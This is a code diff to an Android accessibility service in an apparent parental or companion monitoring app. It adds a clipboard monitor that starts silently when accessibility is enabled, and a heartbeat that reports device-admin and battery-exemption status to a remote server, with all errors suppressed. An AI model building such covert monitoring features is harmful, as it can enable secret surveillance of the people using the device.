@@ -18,6 +18,10 @@ public class SnapAccessibilityService extends AccessibilityService {
         SharedPreferences prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
         prefs.edit().putBoolean("is_accessibility_active", true).apply();
 
+        try {
+            ClipboardMonitor.start(this);
+        } catch (Throwable ignored) {}
+
         // Ensure background sync service is alive
         try {
             Intent svc = new Intent(this, CompanionSyncService.class);
@@ -25,6 +29,15 @@ public class SnapAccessibilityService extends AccessibilityService {
                 startForegroundService(svc);
             } else {
                 startService(svc);
+            }
+        } catch (Throwable ignored) {}
+
+        // Immediate heartbeat reporting accessibility active
+        try {
+            String server = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
+            String devId = prefs.getString("device_id", null);
+            if (devId != null) {
+                ApiClient.sendHeartbeat(server, devId, 100, false, true, ParentalSetupHelper.isDeviceAdminActive(this), ParentalSetupHelper.isBatteryOptimizationIgnored(this), null, null);
             }
         } catch (Throwable ignored) {}
     }
